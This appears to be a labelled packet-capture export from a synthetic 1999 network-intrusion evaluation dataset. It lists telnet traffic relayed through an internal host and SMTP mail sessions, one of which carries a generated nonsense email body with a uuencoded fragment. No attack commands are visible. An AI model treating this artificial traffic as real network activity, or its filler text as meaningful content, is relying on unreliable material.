"R"," R", "406062","12:10:55.118445","172.16.114.50","172.16.112.50","TELNET","60","Telnet Data ..."
"R"," R", "406063","12:10:55.118776","172.16.112.50","172.16.114.50","TELNET","60","Telnet Data ..."
"R"," R", "406064","12:10:55.119096","172.16.114.50","195.115.218.108","TELNET","60","Telnet Data ..."
"R"," R", "406065","12:10:55.129919","195.73.151.50","172.16.112.207","TCP","60","19566 → 25 [SYN] Seq=0 Win=512 Len=0 MSS=1460"
"R"," R", "406066","12:10:55.130337","172.16.112.207","195.73.151.50","TCP","60","25 → 19566 [SYN, ACK] Seq=0 Ack=1 Win=32736 Len=0 MSS=1460"
"R"," R", "406067","12:10:55.131069","195.73.151.50","172.16.112.207","TCP","60","19566 → 25 [ACK] Seq=1 Ack=1 Win=32120 Len=0"
"R"," R", "406068","12:10:55.135832","172.16.114.50","172.16.112.50","TCP","60","2478 → 23 [ACK] Seq=222 Ack=2786 Win=31744 Len=0"
"R"," R", "406069","12:10:55.137922","195.115.218.108","172.16.114.50","TCP","60","18481 → 23 [ACK] Seq=471 Ack=4988 Win=32120 Len=0"
"R"," R", "406070","12:10:55.168132","195.115.218.108","172.16.114.50","TELNET","60","Telnet Data ..."
"R"," R", "406071","12:10:55.168454","172.16.114.50","172.16.112.50","TELNET","60","Telnet Data ..."
"R"," R", "406072","12:10:55.168791","172.16.112.50","172.16.114.50","TELNET","60","Telnet Data ..."
"R"," R", "406073","12:10:55.169111","172.16.114.50","195.115.218.108","TELNET","60","Telnet Data ..."
"R"," R", "406074","12:10:55.185821","172.16.114.50","172.16.112.50","TCP","60","2478 → 23 [ACK] Seq=223 Ack=2787 Win=31744 Len=0"
"R"," R", "406075","12:10:55.187906","195.115.218.108","172.16.114.50","TCP","60","18481 → 23 [ACK] Seq=472 Ack=4989 Win=32120 Len=0"
"R"," R", "406076","12:10:55.278066","195.115.218.108","172.16.114.50","TELNET","60","Telnet Data ..."
"R"," R", "406077","12:10:55.278408","172.16.114.50","172.16.112.50","TELNET","60","Telnet Data ..."
"R"," R", "406078","12:10:55.278731","172.16.112.50","172.16.114.50","TELNET","60","Telnet Data ..."
"R"," R", "406079","12:10:55.279053","172.16.114.50","195.115.218.108","TELNET","60","Telnet Data ..."
"R"," R", "406080","12:10:55.295801","172.16.114.50","172.16.112.50","TCP","60","2478 → 23 [ACK] Seq=224 Ack=2788 Win=31744 Len=0"
"R"," R", "406081","12:10:55.297886","195.115.218.108","172.16.114.50","TCP","60","18481 → 23 [ACK] Seq=473 Ack=4990 Win=32120 Len=0"
"R"," R", "406082","12:10:55.347992","195.115.218.108","172.16.114.50","TELNET","60","Telnet Data ..."
"R"," R", "406083","12:10:55.348326","172.16.114.50","172.16.112.50","TELNET","60","Telnet Data ..."
"R"," R", "406084","12:10:55.348640","172.16.112.50","172.16.114.50","TELNET","60","Telnet Data ..."
"R"," R", "406085","12:10:55.348961","172.16.114.50","195.115.218.108","TELNET","60","Telnet Data ..."
"R"," R", "406086","12:10:55.365787","172.16.114.50","172.16.112.50","TCP","60","2478 → 23 [ACK] Seq=225 Ack=2789 Win=31744 Len=0"
"R"," R", "406087","12:10:55.367875","195.115.218.108","172.16.114.50","TCP","60","18481 → 23 [ACK] Seq=474 Ack=4991 Win=32120 Len=0"
"R"," R", "406088","12:10:55.457968","195.115.218.108","172.16.114.50","TELNET","60","Telnet Data ..."
"R"," R", "406089","12:10:55.458287","172.16.114.50","172.16.112.50","TELNET","60","Telnet Data ..."
"R"," R", "406090","12:10:55.458614","172.16.112.50","172.16.114.50","TELNET","60","Telnet Data ..."
"R"," R", "406091","12:10:55.458934","172.16.114.50","195.115.218.108","TELNET","60","Telnet Data ..."
"R"," R", "406092","12:10:55.475761","172.16.114.50","172.16.112.50","TCP","60","2478 → 23 [ACK] Seq=226 Ack=2790 Win=31744 Len=0"
"R"," R", "406093","12:10:55.477851","195.115.218.108","172.16.114.50","TCP","60","18481 → 23 [ACK] Seq=475 Ack=4992 Win=32120 Len=0"
"R"," R", "406094","12:10:55.507951","195.115.218.108","172.16.114.50","TELNET","60","Telnet Data ..."
"R"," R", "406095","12:10:55.508271","172.16.114.50","172.16.112.50","TELNET","60","Telnet Data ..."
"R"," R", "406096","12:10:55.508604","172.16.112.50","172.16.114.50","TELNET","60","Telnet Data ..."
"R"," R", "406097","12:10:55.508923","172.16.114.50","195.115.218.108","TELNET","60","Telnet Data ..."
"R"," R", "406098","12:10:55.525750","172.16.114.50","172.16.112.50","TCP","60","2478 → 23 [ACK] Seq=227 Ack=2791 Win=31744 Len=0"
"R"," R", "406099","12:10:55.527833","195.115.218.108","172.16.114.50","TCP","60","18481 → 23 [ACK] Seq=476 Ack=4993 Win=32120 Len=0"
"R"," R", "406100","12:10:55.617944","195.115.218.108","172.16.114.50","TELNET","60","Telnet Data ..."
"R"," R", "406101","12:10:55.618262","172.16.114.50","172.16.112.50","TELNET","60","Telnet Data ..."
"R"," R", "406102","12:10:55.618591","172.16.112.50","172.16.114.50","TELNET","60","Telnet Data ..."
"R"," R", "406103","12:10:55.618911","172.16.114.50","195.115.218.108","TELNET","60","Telnet Data ..."
"R"," R", "406104","12:10:55.635727","172.16.114.50","172.16.112.50","TCP","60","2478 → 23 [ACK] Seq=228 Ack=2792 Win=31744 Len=0"
"R"," R", "406105","12:10:55.637825","195.115.218.108","172.16.114.50","TCP","60","18481 → 23 [ACK] Seq=477 Ack=4994 Win=32120 Len=0"
"R"," R", "406106","12:10:55.667933","195.115.218.108","172.16.114.50","TELNET","60","Telnet Data ..."
"R"," R", "406107","12:10:55.668254","172.16.114.50","172.16.112.50","TELNET","60","Telnet Data ..."
"R"," R", "406108","12:10:55.668583","172.16.112.50","172.16.114.50","TELNET","60","Telnet Data ..."
"R"," R", "406109","12:10:55.668902","172.16.114.50","195.115.218.108","TELNET","60","Telnet Data ..."
"R"," R", "406110","12:10:55.685718","172.16.114.50","172.16.112.50","TCP","60","2478 → 23 [ACK] Seq=229 Ack=2793 Win=31744 Len=0"
"R"," R", "406111","12:10:55.687816","195.115.218.108","172.16.114.50","TCP","60","18481 → 23 [ACK] Seq=478 Ack=4995 Win=32120 Len=0"
"R"," R", "406112","12:10:55.767913","195.115.218.108","172.16.114.50","TELNET","60","Telnet Data ..."
"R"," R", "406113","12:10:55.768231","172.16.114.50","172.16.112.50","TELNET","60","Telnet Data ..."
"R"," R", "406114","12:10:55.768563","172.16.112.50","172.16.114.50","TELNET","60","Telnet Data ..."
"R"," R", "406115","12:10:55.768883","172.16.114.50","195.115.218.108","TELNET","60","Telnet Data ..."
"R"," R", "406116","12:10:55.769438","172.16.115.234","172.16.112.100","NBNS","110","Refresh NB PC0<03>"
"R"," R", "406117","12:10:55.785706","172.16.114.50","172.16.112.50","TCP","60","2478 → 23 [ACK] Seq=230 Ack=2794 Win=31744 Len=0"
"R"," R", "406118","12:10:55.787791","195.115.218.108","172.16.114.50","TCP","60","18481 → 23 [ACK] Seq=479 Ack=4996 Win=32120 Len=0"
"R"," R", "406119","12:10:55.877886","195.115.218.108","172.16.114.50","TELNET","60","Telnet Data ..."
"R"," R", "406120","12:10:55.878207","172.16.114.50","172.16.112.50","TELNET","60","Telnet Data ..."
"R"," R", "406121","12:10:55.878559","172.16.112.50","172.16.114.50","TELNET","60","Telnet Data ..."
"R"," R", "406122","12:10:55.878879","172.16.114.50","195.115.218.108","TELNET","60","Telnet Data ..."
"R"," R", "406123","12:10:55.895677","172.16.114.50","172.16.112.50","TCP","60","2478 → 23 [ACK] Seq=231 Ack=2795 Win=31744 Len=0"
"R"," R", "406124","12:10:55.897769","195.115.218.108","172.16.114.50","TCP","60","18481 → 23 [ACK] Seq=480 Ack=4997 Win=32120 Len=0"
"R"," R", "406125","12:10:55.978894","195.115.218.108","172.16.114.50","TELNET","60","Telnet Data ..."
"R"," R", "406126","12:10:55.979197","172.16.114.50","172.16.112.50","TELNET","60","Telnet Data ..."
"R"," R", "406127","12:10:55.979565","172.16.112.50","172.16.114.50","TELNET","60","Telnet Data ..."
"R"," R", "406128","12:10:55.979896","172.16.114.50","195.115.218.108","TELNET","60","Telnet Data ..."
"R"," R", "406129","12:10:55.995657","172.16.114.50","172.16.112.50","TCP","60","2478 → 23 [ACK] Seq=233 Ack=2799 Win=31744 Len=0"
"R"," R", "406130","12:10:55.997742","195.115.218.108","172.16.114.50","TCP","60","18481 → 23 [ACK] Seq=482 Ack=5001 Win=32120 Len=0"
"R"," R", "406131","12:10:56.076019","172.16.112.50","172.16.114.50","TELNET","62","Telnet Data ..."
"R"," R", "406132","12:10:56.076349","172.16.114.50","195.115.218.108","TELNET","62","Telnet Data ..."
"R"," R", "406133","12:10:56.087729","195.115.218.108","172.16.114.50","TCP","60","18481 → 23 [ACK] Seq=482 Ack=5009 Win=32120 Len=0"
"R"," R", "406134","12:10:56.095636","172.16.114.50","172.16.112.50","TCP","60","2478 → 23 [ACK] Seq=233 Ack=2807 Win=31744 Len=0"
"R"," R", "406135","12:10:56.118980","172.16.112.207","172.16.112.50","TELNET","60","Telnet Data ..."
"R"," R", "406136","12:10:56.119614","172.16.112.50","172.16.112.207","TELNET","76","Telnet Data ..."
"R"," R", "406137","12:10:56.122331","172.16.114.148","196.227.33.189","SMTP","137","S: 220 crow.eyrie.af.mil ESMTP Sendmail 8.8.7/8.8.7; Wed, 31 Mar 1999 12:11:02 -0500"
"R"," R", "406138","12:10:56.125526","196.227.33.189","172.16.114.148","SMTP","76","C: EHLO saturn.kiwi.org"
"R"," R", "406139","12:10:56.125795","172.16.114.148","196.227.33.189","SMTP","80","S: 500 Command unrecognized"
"R"," R", "406140","12:10:56.126665","196.227.33.189","172.16.114.148","SMTP","76","C: HELO saturn.kiwi.org"
"R"," R", "406141","12:10:56.126895","172.16.114.148","196.227.33.189","SMTP","98","S: 250 (saturn.kiwi.org) pleased to meet you."
"R"," R", "406142","12:10:56.127778","196.227.33.189","172.16.114.148","SMTP","92","C: MAIL From:<cameronm@saturn.kiwi.org>"
"R"," R", "406143","12:10:56.128013","172.16.114.148","196.227.33.189","SMTP","99","S: 250 <cameronm@saturn.kiwi.org>... Sender Ok"
"R"," R", "406144","12:10:56.128962","196.227.33.189","172.16.114.148","SMTP","91","C: RCPT To:<geraldf@crow.eyrie.af.mil>"
"R"," R", "406145","12:10:56.137632","172.16.112.207","172.16.112.50","TCP","60","7203 → 23 [ACK] Seq=116 Ack=2977 Win=32120 Len=0"
"R"," R", "406146","12:10:56.147610","172.16.114.148","196.227.33.189","TCP","60","25 → 19563 [ACK] Seq=199 Ack=120 Win=32699 Len=0"
"R"," R", "406147","12:10:56.160810","172.16.112.207","172.16.112.50","TELNET","60","Telnet Data ..."
"R"," R", "406148","12:10:56.160990","172.16.114.148","196.227.33.189","SMTP","90","S: 250 <geraldf@crow.eyrie.af.mil> OK"
"R"," R", "406149","12:10:56.161265","172.16.112.50","172.16.112.207","TELNET","60","Telnet Data ..."
"R"," R", "406150","12:10:56.161870","196.227.33.189","172.16.114.148","SMTP","92","C: RCPT To:<andromed@crow.eyrie.af.mil>"
"R"," R", "406151","12:10:56.162096","172.16.114.148","196.227.33.189","SMTP","91","S: 250 <andromed@crow.eyrie.af.mil> OK"
"R"," R", "406152","12:10:56.162927","196.227.33.189","172.16.114.148","SMTP","60","C: DATA"
"R"," R", "406153","12:10:56.164797","172.16.114.148","196.227.33.189","SMTP","104","S: 354 Enter mail, end with ." on a line by itself""
"R"," R", "406154","12:10:56.167293","196.227.33.189","172.16.114.148","SMTP","1078","C: DATA fragment, 1024 bytes"
"R"," R", "406155","12:10:56.177597","172.16.114.148","196.227.33.189","TCP","60","25 → 19563 [ACK] Seq=322 Ack=1188 Win=32736 Len=0"
"R"," R", "406156","12:10:56.177666","172.16.112.207","172.16.112.50","TCP","60","7203 → 23 [ACK] Seq=117 Ack=2981 Win=32120 Len=0"
"R"," R", "406157","12:10:56.179384","196.227.33.189","172.16.114.148","IMF","734","subject: VendorShell dialog is given by id, ,             VendorShell dialog is given by id Apr Edt open the  ,             translation table pcm speech.   ,   ,             Syllable primary function product will have The clan as  ,             quiet: Room, San Francisco de Paris, Les of text stores on  ,             that can arrange when it has an ordinary differential  ,             equations.  Could you My present: more suggestions please  ,             wait see go around right now hundreds of Tex by Moving our  ,             bills, should be take very happen, to understand and of July  ,             would be by w.   , Here is some uuencoded stuff  ,   , begin 644 foo895  , M( @($%L<V\@:6UP;W)T86YT('1O('1E8VAN:7%U92P@9F]R(&]T:&5R(&]R  "
"R"," R", "406158","12:10:56.181949","172.16.114.148","196.227.33.189","SMTP","73","S: 250 Mail accepted"
"R"," R", "406159","12:10:56.182762","196.227.33.189","172.16.114.148","SMTP","60","C: QUIT"
"R"," R", "406160","12:10:56.182971","172.16.114.148","196.227.33.189","SMTP","78","S: 221 Closing connection"
"R"," R", "406161","12:10:56.183871","172.16.114.148","196.227.33.189","TCP","60","25 → 19563 [FIN, ACK] Seq=365 Ack=1874 Win=32736 Len=0"
"R"," R", "406162","12:10:56.184613","196.227.33.189","172.16.114.148","TCP","60","19563 → 25 [ACK] Seq=1874 Ack=366 Win=32120 Len=0"
"R"," R", "406163","12:10:56.189411","196.227.33.189","172.16.114.148","TCP","60","19563 → 25 [FIN, ACK] Seq=1874 Ack=366 Win=32120 Len=0"
"R"," R", "406164","12:10:56.189593","172.16.114.148","196.227.33.189","TCP","60","25 → 19563 [ACK] Seq=366 Ack=1875 Win=32735 Len=0"
"R"," R", "406165","12:10:56.189791","196.227.33.189","172.16.112.194","TCP","60","19619 → 25 [SYN] Seq=0 Win=512 Len=0 MSS=1460"
"R"," R", "406166","12:10:56.190093","172.16.112.194","196.227.33.189","TCP","60","25 → 19619 [SYN, ACK] Seq=0 Ack=1 Win=32736 Len=0 MSS=1460"
"R"," R", "406167","12:10:56.190929","196.227.33.189","172.16.112.194","TCP","60","19619 → 25 [ACK] Seq=1 Ack=1 Win=32120 Len=0"
"R"," R", "406168","12:10:56.197932","172.16.112.207","172.16.112.50","TELNET","60","Telnet Data ..."
"R"," R", "406169","12:10:56.198350","172.16.112.50","172.16.112.207","TELNET","60","Telnet Data ..."
"R"," R", "406170","12:10:56.204615","172.16.112.207","195.73.151.50","SMTP","140","S: 220 robin.eyrie.af.mil Sendmail 4.1/SMI-4.1 ready at Wed, 31 Mar 1999 12:11:02 -0500"
"R"," R", "406171","12:10:56.217598","172.16.112.207","172.16.112.50","TCP","60","7203 → 23 [ACK] Seq=118 Ack=2987 Win=32120 Len=0"
"R"," R", "406172","12:10:56.217765","195.73.151.50","172.16.112.207","TCP","60","19566 → 25 [ACK] Seq=1 Ack=87 Win=32120 Len=0"
"R"," R", "406173","12:10:56.269243","172.16.112.207","172.16.112.50","TELNET","60","Telnet Data ..."
"R"," R", "406174","12:10:56.269633","172.16.112.50","172.16.112.207","TELNET","60","Telnet Data ..."
"R"," R", "406175","12:10:56.287574","172.16.112.207","172.16.112.50","TCP","60","7203 → 23 [ACK] Seq=119 Ack=2988 Win=32120 Len=0"
"R"," R", "406176","12:10:56.307727","172.16.112.207","172.16.112.50","TELNET","60","Telnet Data ..."
"R"," R", "406177","12:10:56.308122","172.16.112.50","172.16.112.207","TELNET","60","Telnet Data ..."
"R"," R", "406178","12:10:56.327592","172.16.112.207","172.16.112.50","TCP","60","7203 → 23 [ACK] Seq=120 Ack=2989 Win=32120 Len=0"
"R"," R", "406179","12:10:56.347787","172.16.112.207","172.16.112.50","TELNET","60","Telnet Data ..."
"R"," R", "406180","12:10:56.348181","172.16.112.50","172.16.112.207","TELNET","60","Telnet Data ..."
"R"," R", "406181","12:10:56.367579","172.16.112.207","172.16.112.50","TCP","60","7203 → 23 [ACK] Seq=121 Ack=2990 Win=32120 Len=0"
"R"," R", "406182","12:10:56.389756","172.16.112.207","172.16.112.50","TELNET","60","Telnet Data ..."
"R"," R", "406183","12:10:56.390145","172.16.112.50","172.16.112.207","TELNET","60","Telnet Data ..."
"R"," R", "406184","12:10:56.407598","172.16.112.207","172.16.112.50","TCP","60","7203 → 23 [ACK] Seq=122 Ack=2991 Win=32120 Len=0"
"R"," R", "406185","12:10:56.444295","172.16.112.207","172.16.112.50","TELNET","60","Telnet Data ..."
"R"," R", "406186","12:10:56.444685","172.16.112.50","172.16.112.207","TELNET","60","Telnet Data ..."
"R"," R", "406187","12:10:56.457548","172.16.112.207","172.16.112.50","TCP","60","7203 → 23 [ACK] Seq=123 Ack=2992 Win=32120 Len=0"
"R"," R", "406188","12:10:56.477929","172.16.112.207","172.16.112.50","TELNET","60","Telnet Data ..."
"R"," R", "406189","12:10:56.478321","172.16.112.50","172.16.112.207","TELNET","60","Telnet Data ..."
"R"," R", "406190","12:10:56.497594","172.16.112.207","172.16.112.50","TCP","60","7203 → 23 [ACK] Seq=124 Ack=2993 Win=32120 Len=0"
"R"," R", "406191","12:10:56.527814","172.16.112.207","172.16.112.50","TELNET","60","Telnet Data ..."
"R"," R", "406192","12:10:56.528210","172.16.112.50","172.16.112.207","TELNET","60","Telnet Data ..."
"R"," R", "406193","12:10:56.547537","172.16.112.207","172.16.112.50","TCP","60","7203 → 23 [ACK] Seq=125 Ack=2994 Win=32120 Len=0"
"R"," R", "406194","12:10:56.567888","172.16.112.207","172.16.112.50","TELNET","60","Telnet Data ..."
"R"," R", "406195","12:10:56.568303","172.16.112.50","172.16.112.207","TELNET","60","Telnet Data ..."
"R"," R", "406196","12:10:56.587568","172.16.112.207","172.16.112.50","TCP","60","7203 → 23 [ACK] Seq=126 Ack=2995 Win=32120 Len=0"
"R"," R", "406197","12:10:56.611231","172.16.112.207","172.16.112.50","TELNET","60","Telnet Data ..."
"R"," R", "406198","12:10:56.611619","172.16.112.50","172.16.112.207","TELNET","60","Telnet Data ..."
"R"," R", "406199","12:10:56.627550","172.16.112.207","172.16.112.50","TCP","60","7203 → 23 [ACK] Seq=127 Ack=2996 Win=32120 Len=0"
"R"," R", "406200","12:10:56.647948","172.16.112.207","172.16.112.50","TELNET","60","Telnet Data ..."
"R"," R", "406201","12:10:56.648342","172.16.112.50","172.16.112.207","TELNET","60","Telnet Data ..."
"R"," R", "406202","12:10:56.667535","172.16.112.207","172.16.112.50","TCP","60","7203 → 23 [ACK] Seq=128 Ack=2997 Win=32120 Len=0"
"R"," R", "406203","12:10:56.699464","172.16.112.207","172.16.112.50","TELNET","60","Telnet Data ..."
"R"," R", "406204","12:10:56.699862","172.16.112.50","172.16.112.207","TELNET","60","Telnet Data ..."
"R"," R", "406205","12:10:56.717514","172.16.112.207","172.16.112.50","TCP","60","7203 → 23 [ACK] Seq=129 Ack=2998 Win=32120 Len=0"
"R"," R", "406206","12:10:56.737865","172.16.112.207","172.16.112.50","TELNET","60","Telnet Data ..."
"R"," R", "406207","12:10:56.738256","172.16.112.50","172.16.112.207","TELNET","60","Telnet Data ..."
"R"," R", "406208","12:10:56.757510","172.16.112.207","172.16.112.50","TCP","60","7203 → 23 [ACK] Seq=130 Ack=2999 Win=32120 Len=0"
"R"," R", "406209","12:10:56.777918","172.16.112.207","172.16.112.50","TELNET","60","Telnet Data ..."
"R"," R", "406210","12:10:56.778313","172.16.112.50","172.16.112.207","TELNET","60","Telnet Data ..."
"R"," R", "406211","12:10:56.790636","195.73.151.50","172.16.112.207","SMTP","78","C: EHLO lambda.orange.com"
"R"," R", "406212","12:10:56.791272","172.16.112.207","195.73.151.50","SMTP","80","S: 500 Command unrecognized"
"R"," R", "406213","12:10:56.792359","195.73.151.50","172.16.112.207","SMTP","78","C: HELO lambda.orange.com"
"R"," R", "406214","12:10:56.792734","172.16.112.207","195.73.151.50","SMTP","100","S: 250 (lambda.orange.com) pleased to meet you."
"R"," R", "406215","12:10:56.793665","195.73.151.50","172.16.112.207","SMTP","93","C: MAIL From:<ingolfk@lambda.orange.com>"
"R"," R", "406216","12:10:56.794082","172.16.112.207","195.73.151.50","SMTP","100","S: 250 <ingolfk@lambda.orange.com>... Sender Ok"
"R"," R", "406217","12:10:56.795038","195.73.151.50","172.16.112.207","SMTP","90","C: RCPT To:<finnm@robin.eyrie.af.mil>"
"R"," R", "406218","12:10:56.796110","172.16.112.207","195.73.151.50","SMTP","89","S: 250 <finnm@robin.eyrie.af.mil> OK"
"R"," R", "406219","12:10:56.796993","195.73.151.50","172.16.112.207","SMTP","60","C: DATA"
"R"," R", "406220","12:10:56.797481","172.16.112.207","172.16.112.50","TCP","60","7203 → 23 [ACK] Seq=131 Ack=3000 Win=32120 Len=0"
